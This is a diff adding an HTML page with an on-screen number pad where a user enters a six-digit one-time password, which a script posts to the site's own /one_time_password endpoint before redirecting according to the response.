@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Enter OTP</title>
+<style>
+  body, html {
+    height: 100%;
+    margin: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    font-family: Arial, sans-serif;
+    background-color: #f0f0f0;
+  }
+  
+  .logo-container {
+    position: absolute;
+    top: 20px; /* Adjusts the distance from the top */
+    left: 50%;
+    transform: translateX(-50%); /* Centers the logo horizontally */
+  }
+
+  .logo-container img {
+    height: 100px; /* Adjust based on your logo's size */
+    width: auto;
+  }
+
+  .otp-title {
+    margin-bottom: 20px;
+    font-size: 24px;
+  }
+
+  .otp-inputs {
+    display: flex;
+    gap: 10px;
+  }
+
+  .otp-inputs input {
+    width: 40px;
+    height: 40px;
+    text-align: center;
+    font-size: 20px;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+  }
+
+  .number-palette {
+    display: grid;
+    grid-template-columns: repeat(3, 60px); /* Creates a 3x3 grid for numbers 1-9 */
+    grid-gap: 10px;
+    justify-content: center;
+    margin-top: 20px;
+  }
+
+  .number-palette .number-btn:nth-child(10) {
+    grid-column: 2; /* Centers the 0 button */
+  }
+
+  .number-btn {
+    width: 60px; /* Increased size for a more dial-pad feel */
+    height: 60px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    background-color: #fff;
+    cursor: pointer;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 20px;
+  }
+
+  .continue-button {
+    margin-top: 20px;
+    padding: 10px 20px;
+    font-size: 16px;
+    border: none;
+    border-radius: 5px;
+    background-color: #4CAF50;
+    color: white;
+    cursor: pointer;
+    display: block; /* Ensures button is block level for centering */
+  }
+
+  .center {
+    display: flex;
+    justify-content: center;
+    width: 100%;
+  }
+
+</style>
+</head>
+<body>
+
+
+<div class="otp-title">Enter OTP</div>
+
+
+
+<form id="otpForm">
+  <div class="otp-inputs">
+    <input type="text" id="digit1" maxlength="1" autofocus>
+    <input type="text" id="digit2" maxlength="1">
+    <input type="text" id="digit3" maxlength="1">
+    <input type="text" id="digit4" maxlength="1">
+    <input type="text" id="digit5" maxlength="1">
+    <input type="text" id="digit6" maxlength="1">
+  </div>
+  <div class="number-palette">
+    <!-- Number buttons will be dynamically generated -->
+  </div>
+  <div class="center">
+    <button type="submit" class="continue-button">Continue</button>
+  </div>
+</form>
+
+<script>
+  const form = document.getElementById('otpForm');
+  const inputs = document.querySelectorAll('#otpForm input[type="text"]');
+  const numberPalette = document.querySelector('.number-palette');
+
+  // Generate number buttons in dial format
+  [1, 2, 3, 4, 5, 6, 7, 8, 9, 0].forEach(num => {
+    const button = document.createElement('button');
+    button.textContent = num;
+    button.type = 'button';
+    button.className = 'number-btn';
+    button.addEventListener('click', () => {
+      for (let j = 0; j < inputs.length; j++) {
+        if (!inputs[j].value) {
+          inputs[j].value = num;
+          if (j < inputs.length - 1) {
+            inputs[j + 1].focus();
+          }
+          break;
+        }
+      }
+    });
+    numberPalette.appendChild(button);
+  });
+
+  // Modify form submission behavior
+  form.addEventListener('submit', function(e) {
+    e.preventDefault(); // Prevent default form submission
+
+    // Concatenate OTP from inputs
+    const otp = Array.from(inputs).map(input => input.value).join('');
+
+    // Send OTP to server
+    fetch('/one_time_password', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({otp: otp}),
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log('Success:', data);
+      if(data.status === 'approved') {
+        window.location.href = '/infopage'; // Redirect to the start page
+      } else {
+        window.location.href = '/'; // Redirect to the success/failure page
+      }
+    })
+    .catch((error) => {
+      console.error('Error:', error);
+    });
+  });
+</script>
+
+
+</body>
+</html>
